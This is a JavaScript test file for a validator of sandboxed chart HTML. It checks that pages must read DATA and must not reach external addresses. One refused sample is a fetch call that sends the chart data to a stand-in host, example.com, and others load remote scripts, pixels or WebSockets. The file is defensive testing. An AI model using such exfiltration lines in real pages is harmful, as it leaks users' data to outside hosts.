const { test } = require('node:test');
const assert = require('node:assert/strict');
const { chartHtmlSchema, chartHtmlProblem } = require('./chartHtml');
const { MAX_CHART_HTML_CHARS } = require('../../constants/dashboard');

const PAGE = `<svg id="c" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 600 260"></svg>
<script>
  const NS = 'http://www.w3.org/2000/svg';
  // one bar per row
  DATA.rows.forEach((row, i) => {
    const bar = document.createElementNS(NS, 'rect');
    bar.setAttribute('x', i * 10);
    document.getElementById('c').appendChild(bar);
  });
</script>`;

test('a page that reads DATA and draws with inline SVG is accepted', () => {
  assert.equal(chartHtmlProblem(PAGE), null);
  assert.equal(chartHtmlSchema.parse(`  ${PAGE}\n`), PAGE);
});

test('a page with no script, or one that never reads DATA, is refused', () => {
  assert.match(chartHtmlProblem('<svg></svg>'), /no <script>/);
  assert.match(chartHtmlProblem('<script>draw([1, 2, 3])</script>'), /never reads DATA/);
});

test('a page that reaches for anything outside the frame is refused', () => {
  const cases = [
    '<script src="https://cdn.example.com/chart.js"></script><script>DATA</script>',
    '<script>fetch("http://example.com/?d=" + JSON.stringify(DATA))</script>',
    '<img src="//example.com/pixel.png"><script>DATA</script>',
    '<script>new WebSocket("wss://example.com"); DATA</script>',
  ];
  for (const html of cases) assert.match(chartHtmlProblem(html), /external address/);
});

test('the schema reports the problem and enforces the size limit', () => {
  const refused = chartHtmlSchema.safeParse('<svg></svg>');
  assert.equal(refused.success, false);
  assert.match(refused.error.issues[0].message, /no <script>/);

  const long = `<script>DATA;${' '.repeat(MAX_CHART_HTML_CHARS)}</script>`;
  assert.equal(chartHtmlSchema.safeParse(long).success, false);
});
